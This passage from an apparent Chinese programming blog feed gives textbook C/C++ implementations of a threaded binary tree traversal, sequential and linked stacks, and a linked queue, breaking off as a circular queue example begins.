function_">InOrderTraverse_Thr</span><span class="hljs-params">(BiThrTree T)</span><br>&#123;<br><span class="hljs-comment">//中序遍历二叉线索树T的非递归算法，对每个数据元素直接输出</span><br>BiThrTree p;<br>p = T-&gt;lchild;       <span class="hljs-comment">// p指向根结点</span><br><span class="hljs-keyword">while</span> (p != T)<span class="hljs-comment">// 空树或遍历结束时，p==T</span><br>&#123;<br><span class="hljs-keyword">while</span> (p-&gt;LTag == <span class="hljs-number">0</span>) <span class="hljs-comment">// 沿左孩子向下</span><br>p = p-&gt;lchild; <span class="hljs-comment">// 访问其左子树为空的结点</span><br><span class="hljs-built_in">cout</span> &lt;&lt; p-&gt;data;<br><span class="hljs-keyword">while</span> (p-&gt;RTag == <span class="hljs-number">1</span> &amp;&amp; p-&gt;rchild != T)<br>&#123;<br>p = p-&gt;rchild;<span class="hljs-comment">// 沿右线索访问后继结点</span><br><span class="hljs-built_in">cout</span> &lt;&lt; p-&gt;data;<br>&#125;S<br>p = p-&gt;rchild;<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>pre-&gt;RTag = <span class="hljs-number">1</span>;<br>pre-&gt;rchild = <span class="hljs-literal">NULL</span>;<br>BiThrTree tree, Thrt;<br><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入建立二叉链表的序列：\n&quot;</span>;<br>CreateBiTree(tree);<br>InOrderThreading(Thrt, tree);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;中序遍历线索二叉树的结果为：\n&quot;</span>;<br>InOrderTraverse_Thr(Thrt);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>code-栈和队列</title>
    <link href="/2022/02/18/code-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"/>
    <url>/2022/02/18/code-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<h1>顺序栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 100</span><br><br><span class="hljs-comment">//顺序栈的定义 </span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> *base;<br><span class="hljs-type">int</span> *top;<br><span class="hljs-type">int</span> stacksize;<br>&#125;SqStack;<br><br><span class="hljs-comment">//初始化</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitStack</span><span class="hljs-params">(SqStack &amp;S)</span><br>&#123;<br>S.base = new <span class="hljs-type">int</span>[MAX]; <span class="hljs-comment">// 为顺序栈动态分配一个最大容量为MAX的数组空间</span><br><span class="hljs-keyword">if</span> (!S.base)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>S.top = S.base;<span class="hljs-comment">//初始化将栈置空，就是让头指针指向尾指针，从语句上讲就是把尾指针的值赋值给头指针 </span><br>S.stacksize = MAX;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">//入栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Push_S</span><span class="hljs-params">(SqStack &amp;S, <span class="hljs-type">int</span> e)</span><br>&#123;<br><span class="hljs-comment">//将元素e入栈 </span><br><span class="hljs-keyword">if</span> (S.top - S.base == S.stacksize) <span class="hljs-comment">// 判断栈是否满 </span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>*S.top++ = e;   <span class="hljs-comment">// *S.top=e;  S.top++;</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">//出栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Pop_S</span><span class="hljs-params">(SqStack &amp;S, <span class="hljs-type">int</span> &amp;e)</span><br>&#123;<br><span class="hljs-comment">//用e返回出栈的元素</span><br><span class="hljs-keyword">if</span> (S.top == S.base) <span class="hljs-comment">// 判断栈是否为空 </span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>e = *--S.top;   <span class="hljs-comment">// --S.top;e=*S.top;</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 取栈顶元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetTop</span><span class="hljs-params">(SqStack S, <span class="hljs-type">int</span> &amp;e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (S.top == S.base)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 栈空</span><br><br>e = *(S.top - <span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">DestryStack</span><span class="hljs-params">(SqStack &amp;S)</span><br>&#123;<br><span class="hljs-keyword">if</span> (S.base)<br>&#123;<br>delete S.base;<br>S.stacksize = <span class="hljs-number">0</span>;<br>S.base = S.top = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>SqStack S;<br><br><span class="hljs-keyword">if</span> (InitStack(S))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;顺序栈初始化成功!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;顺序栈初始化失败!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> loop = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> e1;<br><span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// 入栈</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入入栈元素(输入0终止):\n&quot;</span>);<br><span class="hljs-keyword">while</span> (loop)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入第%d个元素值:&quot;</span>, i++);<br>scanf_s(<span class="hljs-string">&quot;%d&quot;</span>, &amp;e1);<br><span class="hljs-keyword">if</span> (e1 != <span class="hljs-number">0</span>)<br>&#123;<br>Push_S(S, e1);<br><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e1 == <span class="hljs-number">0</span>)<br>&#123;<br>loop = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 取栈顶元素</span><br><span class="hljs-type">int</span> e2;<br>GetTop(S, e2);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈顶元素是:%d\n&quot;</span>, e2);<br><br><span class="hljs-comment">// 出栈</span><br><span class="hljs-type">int</span> e3; <span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (S.top != S.base)<br>&#123;<br>Pop_S(S, e3);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第%d个出栈的元素是:%d\n&quot;</span>, j++, e3);<br>&#125;<br><br>DestryStack(S);<br><br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1>链栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 链栈的存储结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StackNode</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StackNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;StackNode, *LinkStack;<br><br><span class="hljs-comment">// 初始化</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitStack</span><span class="hljs-params">(LinkStack &amp;S)</span><br>&#123;<br>S = <span class="hljs-literal">NULL</span>;   <span class="hljs-comment">// 将栈顶指针置空</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 入栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(LinkStack &amp;S, <span class="hljs-type">int</span> e)</span><br>&#123;<br><span class="hljs-comment">//元素e入栈</span><br>StackNode *p;<br>p = new StackNode;  <span class="hljs-comment">// 生成新节点</span><br><br>p-&gt;data = e;        <span class="hljs-comment">// 将新节点数据域置为e</span><br>p-&gt;next = S;        <span class="hljs-comment">// 将新节点插入栈顶</span><br>S = p;             <span class="hljs-comment">// 修改栈顶指针</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;         <span class="hljs-comment">// 链栈要注意指针的方向是从栈顶指向栈底的 </span><br>&#125;<br><br><span class="hljs-comment">// 出栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Pop</span><span class="hljs-params">(LinkStack &amp;S, <span class="hljs-type">int</span> &amp;e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (S == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-comment">// 栈空</span><br>&#125;<br>e = S-&gt;data;    <span class="hljs-comment">//将栈顶元素赋值给e</span><br>StackNode *p;<br>p = S;         <span class="hljs-comment">// 临时保存栈顶元素空间，准备释放</span><br>S = S-&gt;next;    <span class="hljs-comment">// 修改栈顶指针</span><br>delete p;     <span class="hljs-comment">// 释放原栈顶元素空间</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 取栈顶元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetTop</span><span class="hljs-params">(LinkStack S)</span><br>&#123;<br><span class="hljs-comment">//返回S的栈顶元素,不修改栈顶指针</span><br><span class="hljs-keyword">if</span> (S != <span class="hljs-literal">NULL</span>)  <span class="hljs-comment">// 栈非空</span><br><span class="hljs-keyword">return</span> S-&gt;data;  <span class="hljs-comment">// 返回栈顶元素的值,栈顶指针不变</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">TraveStack</span><span class="hljs-params">(LinkStack S)</span><br>&#123;<br>StackNode *p;<br>p = S;<br><span class="hljs-keyword">while</span> (p)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, p-&gt;data);<br>p = p-&gt;next;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>LinkStack S;<br><br><span class="hljs-keyword">if</span> (InitStack(S))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链栈初始化成功!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链栈初始化失败!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 入栈</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入栈的元素个数:&quot;</span>);<br>scanf_s(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n;)<br>&#123;<br><span class="hljs-type">int</span> e;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入第%d个入栈的元素:&quot;</span>, ++i);<br>scanf_s(<span class="hljs-string">&quot;%d&quot;</span>, &amp;e);<br>Push(S, e);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;遍历栈:\n&quot;</span>);<br>TraveStack(S);<br><br><span class="hljs-comment">// 出栈（取出两个元素）</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>;)<br>&#123;<br><span class="hljs-type">int</span> a;<br>Pop(S, a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第%d个出栈的元素:%d\n&quot;</span>, ++i, a);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;遍历栈:\n&quot;</span>);<br>TraveStack(S);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈顶元素是:%d\n&quot;</span>, GetTop(S));<br><br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1>链队列</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Datatype int</span><br><span class="hljs-comment">//定义节点结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>Datatype data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125;QueueNode;<br><span class="hljs-comment">//定义头节点</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>QueueNode *front;<br>QueueNode *rear;<br>&#125;LinkQueue;<br><br><span class="hljs-comment">//初始化链队列，头节点置空</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitQueue</span><span class="hljs-params">(LinkQueue *Q)</span><br>&#123;<br>Q-&gt;front = Q-&gt;rear = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//判断链队列是否为空</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">QueueEmpty</span><span class="hljs-params">(LinkQueue *Q)</span><br>&#123;<br><span class="hljs-keyword">return</span>(Q-&gt;front == <span class="hljs-literal">NULL</span> &amp;&amp; Q-&gt;rear == <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">//入队</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">EnLinkQueue</span><span class="hljs-params">(LinkQueue *Q, Datatype v)</span><br>&#123;<br>QueueNode *p;<br>p = (QueueNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(QueueNode));<span class="hljs-comment">//为新的节点分配空间</span><br>p-&gt;data = v;<br>p-&gt;next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (QueueEmpty(Q))<br>Q-&gt;front = Q-&gt;rear = p;<br><span class="hljs-keyword">else</span><br>&#123;<br>Q-&gt;rear-&gt;next = p;  <span class="hljs-comment">//将新的节点连接到队列</span><br>Q-&gt;rear = p;             <span class="hljs-comment">//指向队列尾</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//出队</span><br>Datatype <span class="hljs-title function_">DeLinkQueue</span><span class="hljs-params">(LinkQueue *Q)</span><br>&#123;<br>Datatype i;<br>QueueNode *s;<br><span class="hljs-keyword">if</span> (QueueEmpty(Q))     <span class="hljs-comment">//判断队列是否为空</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error,the linkqueue is empty!&quot;</span>);<br>s = Q-&gt;front;<br>i = s-&gt;data;<br><span class="hljs-keyword">if</span> (Q-&gt;front == Q-&gt;rear)   <span class="hljs-comment">//判断队列是否只有一个节点</span><br>Q-&gt;front = Q-&gt;rear = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">else</span><br>Q-&gt;front = s-&gt;next;<br><span class="hljs-built_in">free</span>(s);<br><span class="hljs-keyword">return</span> i;<br><br>&#125;<br><br><span class="hljs-comment">//读取队列头元素，不改变队列状态</span><br>Datatype <span class="hljs-title function_">ReadLinkQueue</span><span class="hljs-params">(LinkQueue *Q)</span><br>&#123;<br>Datatype i;<br><span class="hljs-keyword">if</span> (QueueEmpty(Q))     <span class="hljs-comment">//判断队列是否为空</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error,the linkqueue is empty!&quot;</span>);<br>i = Q-&gt;front-&gt;data;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br><br><span class="hljs-comment">//销毁链队列</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">DestryQueue</span><span class="hljs-params">(LinkQueue &amp;Q)</span><br>&#123;<br><span class="hljs-keyword">while</span> (Q.front) &#123;<br>Q.rear = Q.front-&gt;next;<br>delete Q.front;<br>Q.front = Q.rear;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>LinkQueue Q;<br>Datatype i = <span class="hljs-number">1</span>;<br>InitQueue(&amp;Q);<br><span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">6</span>)<br>&#123;<br>EnLinkQueue(&amp;Q, i);      <span class="hljs-comment">//将1-6入队</span><br>i++;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DeLinkQueue: %d\n&quot;</span>, DeLinkQueue(&amp;Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DeLinkQueue: %d\n&quot;</span>, DeLinkQueue(&amp;Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ReadLinkQueue: %d\n&quot;</span>, ReadLinkQueue(&amp;Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ReadLinkQueue: %d\n&quot;</span>, ReadLinkQueue(&amp;Q));<br><br>EnLinkQueue(&amp;Q, <span class="hljs-number">9</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The all number of the linkqueue:\n&quot;</span>);<br><span class="hljs-keyword">while</span> (!QueueEmpty(&amp;Q))<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\t&quot;</span>, DeLinkQueue(&amp;Q));         <span class="hljs-comment">//输出队列中所有数据</span><br><br>DestryQueue(Q);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1>循环队列</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span 